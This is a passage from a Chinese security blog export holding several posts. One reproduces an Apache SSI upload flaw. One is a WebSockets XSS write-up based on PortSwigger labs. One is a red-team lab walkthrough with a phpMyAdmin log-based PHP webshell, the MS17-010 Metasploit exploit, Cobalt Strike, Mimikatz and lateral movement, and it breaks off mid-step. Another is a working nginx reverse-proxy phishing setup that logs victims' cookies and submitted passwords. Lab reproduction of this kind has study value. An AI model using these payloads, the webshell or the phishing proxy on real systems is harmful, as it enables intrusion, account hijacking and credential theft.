<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210420/16188726054506.png" alt="image-20201020012001079"></p>
<p>成功上传，然后访问shell.shtml，可见命令已成功执行：</p>
<p><img src="https://image.3001.net/images/20210420/16188726075102.png" alt="image-20201020012058471"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Vulhub复现</tag>
        <tag>Apache</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理钓鱼</title>
    <url>/2020/10/23/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/</url>
    <content><![CDATA[<h1 id="nginx反向代理钓鱼"><a href="#nginx反向代理钓鱼" class="headerlink" title="nginx反向代理钓鱼"></a>nginx反向代理钓鱼</h1><h2 id="一、反向代理"><a href="#一、反向代理" class="headerlink" title="一、反向代理"></a>一、反向代理</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。</p>
<p><img src="https://image.3001.net/images/20201024/16034962257029.png" alt="image-20201021042310179"></p>
<a id="more"></a>

<h2 id="二、部署配置"><a href="#二、部署配置" class="headerlink" title="二、部署配置"></a>二、部署配置</h2><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1.安装nginx"></a>1.安装nginx</h3><p>不做赘述，具体百度。</p>
<h3 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h3><p>打开nginx的配置文件<code>/etc/nginx/nginx.conf</code>，具体虚拟主机的配置包含在另一个文件中</p>
<p><img src="https://image.3001.net/images/20201024/160349622898.png" alt="image-20201021043958270"></p>
<p>打开<code>/etc/nginx/conf.d/</code>文件夹，新建一个test.conf文件，做具体的信息配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8080;</span><br><span class="line">        server_name     47.xx.xx.xx;</span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        access_log      &#x2F;var&#x2F;log&#x2F;nginx&#x2F;test.log Testlog;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                proxy_next_upstream http_502 http_504 error timeout invalid_header;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;xxx.com&#x2F;;</span><br><span class="line">                proxy_set_header Host 47.xx.xx.xx;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>server_name</code> 为域名，这里我用自己服务器的ip<br><code>access_log</code> 为设置输出日志的路径<br><code>proxy_next_upstream</code> 如果后端的服务器返回 502、504、执行超时等错误，自动将请求转发upstream负载均衡池中的另一台服务器，实现故障转移。<br><code>proxy_pass</code> 需要反向代理的网站<br><code>proxy_set_header</code>  用于在向反向代理的后端 Web 服务器发起请求时添加指定的 Header头信息。</p>
<p>当后端 Web 服务器上有多个基于域名的虚拟主机时，要通过添加 Header 头信息 Host，用于指定请求的域名，这样后端 Web 服务器才能识别该反向代理访问请求由哪一个虚拟主机来处理。</p>
<p>最后我们还需要设置以下 访问日志需要获取的内容 也是在<code>nginx.conf</code>里修改。在http模块中添加：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_format Testlog escape&#x3D;json &#39;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#39; $http_cookie;</span><br></pre></td></tr></table></figure>

<p>Testlog 要和上面的<code>access_log</code>对应不然日志不会起作用。</p>
<p>重点是<code>$request_body(获取post数据),$http_cookie(获取cookie数据)</code>这就是我们钓鱼的核心了。当有人访问并登陆我们反向代理的网站以后 我们点开日志就可以看到他的cookie和post提交的用户名和密码了。</p>
<h2 id="三、上手实战"><a href="#三、上手实战" class="headerlink" title="三、上手实战"></a>三、上手实战</h2><p>使用某网站做上述配置进行反向代理，配置完成后访问自己服务器ip，可以看到是自己的ip，显示目标系统的界面，说明反向代理成功。</p>
<p><img src="https://image.3001.net/images/20201024/16034962325695.png" alt="image-20201021051523406"></p>
<p>进行登录操作后，可以在日志中看到获取的cookie</p>
<p><img src="https://image.3001.net/images/20201024/16034962382259.png" alt="image-20201021052001089"></p>
<p>使用cookie进行登录访问，成功进入。</p>
<p><img src="https://image.3001.net/images/20201024/16034962359939.png" alt="image-20201021052143060"></p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>nginx</tag>
        <tag>钓鱼</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSockets安全漏洞</title>
    <url>/2020/10/20/WebSockets%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="WebSockets安全漏洞"><a href="#WebSockets安全漏洞" class="headerlink" title="WebSockets安全漏洞"></a>WebSockets安全漏洞</h1><h2 id="1-WebSockets"><a href="#1-WebSockets" class="headerlink" title="1. WebSockets"></a>1. WebSockets</h2><p>WebSockets广泛用于现代Web应用程序中。它们通过HTTP发起，并通过双向双向通信提供长期连接。</p>
<p>WebSocket用于各种目的，包括执行用户操作和传输敏感信息。几乎与常规HTTP一起出现的任何Web安全漏洞也可能与WebSockets通信有关。</p>
<p><img src="https://image.3001.net/images/20201018/16030254226387.png" alt="image-20201016085345616"></p>
<a id="more"></a>

<h2 id="2-HTTP和WebSockets有什么区别？"><a href="#2-HTTP和WebSockets有什么区别？" class="headerlink" title="2. HTTP和WebSockets有什么区别？"></a>2. HTTP和WebSockets有什么区别？</h2><p>Web浏览器和网站之间的大多数通信使用HTTP。使用HTTP，客户端发送请求，服务器返回响应。通常，响应立即发生，并且事务完成。即使网络连接保持打开状态，这也将用于请求和响应的单独事务。</p>
<p>一些现代网站使用WebSockets。WebSocket连接是通过HTTP发起的，通常是长期存在的。消息可以随时向任一方向发送，并且本质上不是事务性的。在客户端或服务器准备发送消息之前，连接通常将保持打开和空闲状态。</p>
<p>WebSocket在需要低延迟或服务器启动消息的情况下（例如财务数据的实时提要）特别有用。</p>
<h2 id="3-如何建立WebSocket连接？"><a href="#3-如何建立WebSocket连接？" class="headerlink" title="3. 如何建立WebSocket连接？"></a>3. 如何建立WebSocket连接？</h2><p>WebSocket连接通常是使用客户端JavaScript创建的，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var ws &#x3D; new WebSocket(&quot;wss:&#x2F;&#x2F;normal-website.com&#x2F;chat&quot;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意</p>
<p>该<code>wss</code>协议建立在一个加密的TLS连接的WebSocket，而<code>ws</code>协议使用未加密的连接。</p>
</blockquote>
<p>为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。浏览器发出WebSocket握手请求，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w&#x3D;&#x3D;</span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line">Cookie: session&#x3D;KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line">Upgrade: websocket</span><br></pre></td></tr></table></figure>

<p>如果服务器接受连接，则它将返回WebSocket握手响应，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 101 Switching Protocols</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: websocket</span><br><span class="line">Sec-WebSocket-Accept: 0FFP+2nmNIf&#x2F;h+4BP36k9uzrYGk&#x3D;</span><br></pre></td></tr></table></figure>

<p>此时，网络连接保持打开状态，并且可以用于向任一方向发送WebSocket消息。</p>
<blockquote>
<p>注意</p>
<p>WebSocket握手消息的几个功能值得注意：</p>
<ul>
<li>请求和响应中 的<code>Connection</code>和<code>Upgrade</code>标头表示这是WebSocket握手。</li>
<li>请求头的<code>Sec-WebSocket-Version</code>指定WebSocket协议版本的客户端希望使用。通常是这样<code>13</code>。</li>
<li>请求头的<code>Sec-WebSocket-Key</code>包含Base64编码的随机值，这应该在每个握手请求是随机产生的。</li>
<li>响应头的<code>Sec-WebSocket-Accept</code>包含在提交的值的散列<code>Sec-WebSocket-Key</code>请求头，具有在协议规范中定义的特定的字符串串联。这样做是为了防止由于服务器配置错误或代 理缓存错误而引起的误导响应。</li>
</ul>
</blockquote>
<h2 id="4-WebSocket消息是什么样的？"><a href="#4-WebSocket消息是什么样的？" class="headerlink" title="4. WebSocket消息是什么样的？"></a>4. WebSocket消息是什么样的？</h2><p>建立WebSocket连接后，客户端或服务器可以在任一方向上异步发送消息。</p>
<p>可以使用客户端JavaScript从浏览器发送一条简单消息，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ws.send(&quot;Peter Wiener&quot;);</span><br></pre></td></tr></table></figure>

<p>原则上，WebSocket消息可以包含任何内容或数据格式。在现代应用程序中，JSON通常用于在WebSocket消息中发送结构化数据。</p>
<p>例如，使用WebSockets的聊天机器人应用程序可能会发送如下消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&quot;Hal Pline&quot;,&quot;content&quot;:&quot;I wanted to be a Playstation growing up, not a device to answer your inane questions&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-WebSockets安全漏洞"><a href="#5-WebSockets安全漏洞" class="headerlink" title="5. WebSockets安全漏洞"></a>5. WebSockets安全漏洞</h2><p>原则上，实际上与WebSockets有关的任何Web安全漏洞都可能出现：</p>
<ul>
<li>传输到服务器的用户提供的输入可能会以不安全的方式进行处理，从而导致漏洞，例如SQL注入或XML外部实体注入。</li>
<li>通过WebSockets达到的某些盲目漏洞可能仅使用带外（OAST）技术才能检测到。</li>
<li>如果攻击者控制的数据通过WebSockets传输到其他应用程序用户，则可能导致XSS或其他客户端漏洞。</li>
</ul>
<h3 id="5-1-处理WebSocket消息以利用漏洞"><a href="#5-1-处理WebSocket消息以利用漏洞" class="headerlink" title="5.1 处理WebSocket消息以利用漏洞"></a>5.1 处理WebSocket消息以利用漏洞</h3><p>可以通过篡改WebSocket消息的内容来发现和利用影响WebSocket的大多数基于输入的漏洞。</p>
<p>例如，假设聊天应用程序使用WebSockets在浏览器和服务器之间发送聊天消息。用户键入聊天消息时，将向服务器发送如下所示的WebSocket消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;Hello Carlos&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>消息的内容（再次通过WebSockets）传输到另一个聊天用户，并在用户的浏览器中呈现，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;td&gt;Hello Carlos&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，只要没有其他输入处理或防御措施在起作用，攻击者就可以通过提交以下WebSocket消息来执行概念验证XSS攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39;&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>靶场url：<a href="https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities" target="_blank" rel="noopener">https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities</a></p>
<p>复现详情：</p>
<p>首页存在实时聊天功能，对话框直接插入xss，抓包修改：</p>
<p><img src="https://image.3001.net/images/20201018/16030254489930.png" alt="image-20201016234300384"></p>
<p>修改为：</p>
<p><img src="https://image.3001.net/images/20201018/16030254508473.png" alt="image-20201016234321766"></p>
<p>可以看到payload已成功插入：</p>
<p><img src="https://image.3001.net/images/20201018/16030254533623.png" alt="image-20201016234448709"></p>
<p>成功弹窗：</p>
<p><img src="https://image.3001.net/images/20201018/16030254567741.png" alt="image-20201016234509914"></p>
<h3 id="5-2-操纵WebSocket握手以利用漏洞"><a href="#5-2-操纵WebSocket握手以利用漏洞" class="headerlink" title="5.2 操纵WebSocket握手以利用漏洞"></a>5.2 操纵WebSocket握手以利用漏洞</h3><p>只能通过操纵WebSocket握手来发现和利用某些WebSocket漏洞。这些漏洞往往涉及设计缺陷，例如：</p>
<ul>
<li>在HTTP标头中放错位置的信任以执行安全性决策，例如<code>X-Forwarded-For</code>标头。</li>
<li>会话处理机制存在缺陷，因为处理WebSocket消息的会话上下文通常由握手消息的会话上下文确定。</li>
<li>应用程序使用的自定义HTTP标头引入的攻击面。</li>
</ul>
<p>靶机url：<a href="https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities" target="_blank" rel="noopener">https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities</a></p>
<p>复现详情：</p>
<p>同理，直接在实时聊天的对话框中插入xss，观察到攻击已被阻止，并且WebSocket连接已终止。重新加载后，观察到连接尝试失败，因为IP地址已被禁止。</p>
<p><img src="https://image.3001.net/images/20201018/16030254588558.png" alt="image-20201017004507988"></p>
<p>重新请求并抓包，修改请求头，添加xff：</p>
<p><img src="https://image.3001.net/images/20201018/16030254604511.png" alt="image-20201017004656270"></p>
<p>可以重新连接WebSocket，并尝试有效的xss：</p>
<p><img src="https://image.3001.net/images/20201018/16030254625868.png" alt="image-20201017010007974"></p>
<p>成功弹窗：</p>
<p><img src="https://image.3001.net/images/20201018/16030254654499.png" alt="image-20201017005721299"></p>
<h3 id="5-3-使用跨站点WebSocket利用漏洞"><a href="#5-3-使用跨站点WebSocket利用漏洞" class="headerlink" title="5.3 使用跨站点WebSocket利用漏洞"></a>5.3 使用跨站点WebSocket利用漏洞</h3><p>当攻击者从攻击者控制的网站建立跨域WebSocket连接时，会出现一些WebSockets安全漏洞。这称为跨站点WebSocket劫持攻击，它涉及利用WebSocket握手上的跨站点请求伪造（CSRF）漏洞。攻击通常会产生严重的影响，使攻击者可以代表受害者用户执行特权操作或捕获受害者用户可以访问的敏感数据。</p>
<h4 id="5-3-1-什么是跨站点WebSocket劫持？"><a href="#5-3-1-什么是跨站点WebSocket劫持？" class="headerlink" title="5.3.1 什么是跨站点WebSocket劫持？"></a>5.3.1 什么是跨站点WebSocket劫持？</h4><p>跨站点WebSocket劫持（也称为跨域WebSocket劫持）涉及WebSocket握手上的跨站点请求伪造（CSRF）漏洞。当WebSocket握手请求仅依靠HTTP cookie进行会话处理并且不包含任何CSRF令牌或其他不可预测的值时，就会出现这种情况。</p>
<p>攻击者可以在自己的域上创建恶意网页，从而建立与易受攻击的应用程序的跨站点WebSocket连接。该应用程序将在受害用户与该应用程序的会话的上下文中处理连接。</p>
<p>然后，攻击者的页面可以通过连接向服务器发送任意消息，并读取从服务器接收回的消息内容。这意味着，与常规CSRF不同，攻击者可以与受感染的应用程序进行双向交互。</p>
<h4 id="5-3-2-跨站点WebSocket劫持有什么影响？"><a href="#5-3-2-跨站点WebSocket劫持有什么影响？" class="headerlink" title="5.3.2 跨站点WebSocket劫持有什么影响？"></a>5.3.2 跨站点WebSocket劫持有什么影响？</h4><p>成功的跨站点WebSocket劫持攻击通常会使攻击者能够：</p>
<ul>
<li><strong>执行伪装成受害者用户的未授权操作。</strong>与常规CSRF一样，攻击者可以将任意消息发送到服务器端应用程序。如果应用程序使用客户端生成的WebSocket消息执行任何敏感操作，则攻击者可以跨域生成合适的消息并触发这些操作。</li>
<li><strong>检索用户可以访问的敏感数据。</strong>与常规CSRF不同，跨站点WebSocket劫持使攻击者可以通过劫持的WebSocket与易受攻击的应用程序进行双向交互。如果应用程序使用服务器生成的WebSocket消息将任何敏感数据返回给用户，则攻击者可以拦截这些消息并捕获受害用户的数据。</li>
</ul>
<h4 id="5-3-3-执行跨站点WebSocket劫持攻击"><a href="#5-3-3-执行跨站点WebSocket劫持攻击" class="headerlink" title="5.3.3 执行跨站点WebSocket劫持攻击"></a>5.3.3 执行跨站点WebSocket劫持攻击</h4><p>由于跨站点WebSocket劫持攻击本质上是WebSocket握手上的CSRF漏洞，因此执行攻击的第一步是检查应用程序执行的WebSocket握手，并确定是否针对CSRF进行了保护。</p>
<p>就CSRF攻击的正常情况而言，您通常需要查找仅依赖HTTP cookie进行会话处理并且在请求参数中不使用任何令牌或其他不可预测值的握手消息。</p>
<p>例如，以下WebSocket握手请求可能容易受到CSRF的攻击，因为唯一的会话令牌是在cookie中传输的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;chat HTTP&#x2F;1.1</span><br><span class="line">Host: normal-website.com</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w&#x3D;&#x3D;</span><br><span class="line">Connection: keep-alive, Upgrade</span><br><span class="line">Cookie: session&#x3D;KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line">Upgrade: websocket</span><br></pre></td></tr></table></figure>

<blockquote>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>该<code>Sec-WebSocket-Key</code>头包含一个随机值，以防止缓存代理的错误，而不是用于身份验证或会话处理的目的。</p>
</blockquote>
<p>如果WebSocket握手请求容易受到CSRF的攻击，则攻击者的网页可以执行跨站点请求以在易受攻击的站点上打开WebSocket。攻击的下一步将完全取决于应用程序的逻辑以及它如何使用WebSockets。攻击可能涉及：</p>
<ul>
<li>发送WebSocket消息以代表受害者用户执行未经授权的操作。</li>
<li>发送WebSocket消息以检索敏感数据。</li>
<li>有时，只是等待包含敏感数据的传入消息到达。</li>
</ul>
<h2 id="6-如何保护WebSocket连接"><a href="#6-如何保护WebSocket连接" class="headerlink" title="6. 如何保护WebSocket连接"></a>6. 如何保护WebSocket连接</h2><p>为了将WebSocket引起的安全漏洞的风险降至最低，请使用以下准则：</p>
<ul>
<li>使用<code>wss://</code>协议（基于TLS的WebSockets）。</li>
<li>硬编码WebSockets终结点的URL，当然不要将用户可控制的数据合并到此URL中。</li>
<li>保护WebSocket握手消息免受CSRF的攻击，以避免跨站点WebSocket劫持漏洞。</li>
<li>双向将通过WebSocket接收的数据视为不可信。在服务器和客户端上安全地处理数据，以防止基于输入的漏洞，例如SQL注入和跨站点脚本。</li>
</ul>
]]></content>
      <categories>
        <category>WebSockets</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>ATT&amp;CK实战系列 红队实战（一）</title>
    <url>/2020/09/03/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%20%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h2><h3 id="1-1-靶机下载"><a href="#1-1-靶机下载" class="headerlink" title="1.1 靶机下载"></a>1.1 靶机下载</h3><p>百度网盘： <a href="https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset" target="_blank" rel="noopener">https://pan.baidu.com/s/1nC6V8e_EuKfaLb2IuEbe7w&amp;shfl=sharepset</a><br>密码为：n1u2。<br>开机密码：hongrisec@2019</p>
<h3 id="1-2-网络拓扑及IP规划"><a href="#1-2-网络拓扑及IP规划" class="headerlink" title="1.2 网络拓扑及IP规划"></a>1.2 网络拓扑及IP规划</h3><p>​    下载包中的VM1为win7，VM2为win2003，VM3为win2008，拓扑图为下图所示：</p>
<p><img src="https://image.3001.net/images/20200904/15992123162653.png" alt="0"></p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">win 7（VM1）：</span><br><span class="line">	外网ip：192.168.44.131</span><br><span class="line">	内网ip：192.168.88.143</span><br><span class="line">	关闭域防火墙</span><br><span class="line">	开启phpstudy</span><br><span class="line">win2003（VM2）：</span><br><span class="line">	内网ip：192.168.88.141</span><br><span class="line">win2008（VM3）：</span><br><span class="line">	内网ip：192.168.88.138</span><br><span class="line">	关闭防火墙</span><br></pre></td></tr></table></figure>

<p>​    内网中的win 7、win2003、win2008能够互相ping通。</p>
<h2 id="2-win-7渗透（VM1）"><a href="#2-win-7渗透（VM1）" class="headerlink" title="2. win 7渗透（VM1）"></a>2. win 7渗透（VM1）</h2><h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><p>1）使用nmap扫描本网段存活主机。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -O 192.168.44.0&#x2F;24</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/1599212320413.png" alt="image-20200825102051387"></p>
<p>2）得到192.168.44.131主机并开启了80端口，通过访问得到服务器版本、物理路径等敏感信息。</p>
<p><img src="https://image.3001.net/images/20200904/15992123234442.png" alt="image-20200825102901271"></p>
<p>3）进行目录扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.44.131</span><br></pre></td></tr></table></figure>

<p>4）再使用御剑进行扫描，</p>
<p><img src="https://image.3001.net/images/20200904/15992123264893.png" alt="image-20200825104554719"></p>
<p>得到<code>/phpmyadmin/</code> <code>beifen.rar</code> 等一些敏感目录。</p>
<h3 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h3><p>1）下载<code>beifen.rar</code> 网站备份文件，查找关键信息，得到数据库的连接用户名密码。</p>
<p><img src="https://image.3001.net/images/20200904/15992123288796.png" alt="image-20200825110115423"></p>
<p>2）访问<code>/phpmyadmin</code> ，使用获取的用户名密码进行登录，成功进入。</p>
<p><img src="https://image.3001.net/images/20200904/15992123303851.png" alt="image-20200825110423084"></p>
<p>3）可使用sql写入一句话，写入失败。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39; INTO OUTFILE C:&#x2F;phpstudy&#x2F;WWW&#x2F;joker.php;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123347900.png" alt="image-20200825110948894"></p>
<p>4）查看<code>secure-file-priv</code> 是否为空，很可惜，值为NULL，无法写入一句话。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123367194.png" alt="image-20200825111054954"></p>
<p>5）转换思路，利⽤ log ⽇志插⼊⼀句话，首先查看日志是否开启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123383073.png" alt="image-20200825111814209"></p>
<p>6）开启general_log将所有查询语句记录到新指定的可访问的文件中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log&#x3D;&quot;ON&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123405042.png" alt="image-20200825112229269"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set global general_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;joker.php&#39;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123426237.png" alt="image-20200825112349936"></p>
<p>7）查询一句话写入我们指定的新文件中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123442231.png" alt="image-20200825112815425"></p>
<p>8）菜刀连接。</p>
<p><img src="https://image.3001.net/images/20200904/15992123471469.png" alt="image-20200825131954992"></p>
<h3 id="2-3-其他漏洞利用"><a href="#2-3-其他漏洞利用" class="headerlink" title="2.3 其他漏洞利用"></a>2.3 其他漏洞利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1）后台弱口令</span><br><span class="line">2）mysql、phpmyadmin弱口令</span><br><span class="line">3）留言板存储型xss</span><br><span class="line">4）后台修改模板处任意文件读写</span><br></pre></td></tr></table></figure>

<p>​    其他的不做累述。具体可看yxcms漏洞分析。</p>
<h3 id="2-4-445端⼝（ms17-010）漏洞"><a href="#2-4-445端⼝（ms17-010）漏洞" class="headerlink" title="2.4 445端⼝（ms17_010）漏洞"></a>2.4 445端⼝（ms17_010）漏洞</h3><p>1）开启msf，尝试永恒之蓝。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123537339.png" alt="image-20200825163056373"></p>
<p>2）验证漏洞存在与否。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set RHOSTS 192.168.44.131</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123566392.png" alt="image-20200825164940676"></p>
<p>3）利用漏洞反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">set RHOSTS 192.168.44.131</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200904/15992123596617.png" alt="image-20200825165523015"></p>
<p>​    getshell成功，并直接提权成system。</p>
<h2 id="3-内网渗透"><a href="#3-内网渗透" class="headerlink" title="3.内网渗透"></a>3.内网渗透</h2><h3 id="3-1-信息收集"><a href="#3-1-信息收集" class="headerlink" title="3.1 信息收集"></a>3.1 信息收集</h3><p>​    拿下web服务器之后可以上传一个cs马，win7执行后，cs服务端上线主机。</p>
<p><img src="https://image.3001.net/images/20200904/15992123622889.png" alt="image-20200902144954719"></p>
<h4 id="3-1-1-minikatz获取账号密码"><a href="#3-1-1-minikatz获取账号密码" class="headerlink" title="3.1.1 minikatz获取账号密码"></a>3.1.1 minikatz获取账号密码</h4><p>​    使用<code>Mimikatz</code>跑⼀下</p>
<p><img src="https://image.3001.net/images/20200904/15992123648738.png" alt="image-20200902145609561"></p>
<p>​    得到账户：Administrator 密码：hongrisec@2020</p>
<p><img src="https://image.3001.net/images/20200904/15992123678613.png" alt="image-20200902145542840"></p>
<h4 id="3-1-2-基本信息收集"><a href="#3-1-2-基本信息收集" class="headerlink" title="3.1.2 基本信息收集"></a>3.1.2 基本信息收集</h4><p>​    一些常用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net time &#x2F;domain        #查看时间服务器，判断主域，主域服务器都做时间服务器</span><br><span class="line">net user &#x2F;domain        #查看域用户</span><br><span class="line">net view &#x2F;domain        #查看有几个域</span><br><span class="line">ipconfig &#x2F;all 　　　　　  #查询本机IP段，所在域等 </span><br><span class="line">net config Workstation  #当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span><br><span class="line">net user 　　　　　　　   #本机用户列表</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain   #查看域内所有的主机名 </span><br><span class="line">net group &quot;domain admins&quot; &#x2F;domain      #查看域管理员 </span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain #查看域控</span><br><span class="line">net localhroup administrators          #本机管理员[通常含有域用户]</span><br><span class="line">net user 用户名 &#x2F;domain                 #获取指定用户的账户信息  </span><br><span class="line">net group &#x2F;domain                      #查询域里面的工作组 </span><br><span class="line">net group 组名 &#x2F;domain                  #查询域中的某工作组</span><br></pre></td></tr></table></figure>

<h4 id="3-1-3-内网主机存活和端口扫描"><a href="#3-1-3-内网主机存活和端口扫描" class="headerlink" title="3.1.3 内网主机存活和端口扫描"></a>3.1.3 内网主机存活和端口扫描</h4><p>​    可以使用cs进行一波内网主机存活和端口的扫描。</p>
<p><img src="https://image.3001.net/images/20200904/15992123708213.png" alt="image-20200902153850150"></p>
<p>​    选择内网ip对应的网段。</p>
<p><img src="https://image.3001.net/images/20200904/15992123727545.png" alt="image-20200902153918336"></p>
<p>​    同时也可以使用命令进行扫描：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">portscan 192.168.44.0&#x2F;24 1-1024,3389,5900-6000</span><br></pre></td></tr></table></figure>

<p>​    得到存活的主机ip和开放的端口</p>
<p><img src="https://image.3001.net/images/20200904/15992123754038.png" alt="image-20200902154741262"></p>
<h3 id="3-2-横向移动"><a href="#3-2-横向移动" class="headerlink" title="3.2 横向移动"></a>3.2 横向移动</h3><p>​    添加Pivotting Listener</p>
<p><img src="https://image.3001.net/images/20200904/15992123786299.png" alt="image-20200902172235950"></p>
<p>​    箭头所指填内网ip</p>
<p><img src="https://image.3001.net/images/20200904/1599212380801.png" alt="image-20200902172320616"></p>
<p>​    然后新建⼀个 psexec 程序</p>
